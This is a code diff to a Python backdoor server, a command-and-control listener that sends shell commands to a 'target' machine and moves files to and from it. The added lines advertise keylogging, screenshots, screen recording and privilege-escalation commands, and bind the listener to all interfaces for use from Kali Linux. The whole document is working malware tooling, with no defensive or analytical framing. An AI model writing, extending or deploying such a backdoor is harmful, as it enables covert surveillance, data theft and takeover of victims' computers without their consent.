@@ -37,6 +37,8 @@ def upload_file(file_name):
     f = open(file_name, 'rb')
     # Read the contents of the file and send them over the network connection to the target.
     target.send(f.read())
+    # Close the file after uploading is complete.
+    f.close()
 
 
 # Function to download a file from the target machine
@@ -62,6 +64,16 @@ def download_file(file_name):
 
 # Function for the main communication loop with the target
 def target_communication():
+    print("\n=== Enhanced Backdoor Server ===")
+    print("Available commands:")
+    print("Basic: whoami, dir, ipconfig, cd <path>")
+    print("Keylogger: start_keylog, stop_keylog, get_keylog")
+    print("Recording: screenshot, start_recording, stop_recording, list_recordings")
+    print("Privilege: check_privs, escalate, privesc_report")
+    print("Files: upload <file>, download <file>")
+    print("Control: quit, clear")
+    print("===============================\n")
+    
     while True:
         # Prompt the user for a command to send to the target.
         command = input('* Shell~%s: ' % str(ip))
@@ -91,11 +103,12 @@ def target_communication():
 # Create a socket for the server
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-# Bind the socket to a specific IP address ('192.168.1.12') and port (5555).
-sock.bind(('192.168.1.12', 5555))
+# Bind the socket to listen on all interfaces and port 5555
+# CHANGE IP TO YOUR KALI LINUX IP OR USE 0.0.0.0 to listen on all interfaces
+sock.bind(('0.0.0.0', 5555))  # Listen on all interfaces
 
 # Start listening for incoming connections (maximum 5 concurrent connections).
-print('[+] Listening For The Incoming Connections')
+print('[+] Listening For The Incoming Connections on port 5555')
 sock.listen(5)
 
 # Accept incoming connection from the target and obtain the target's IP address.
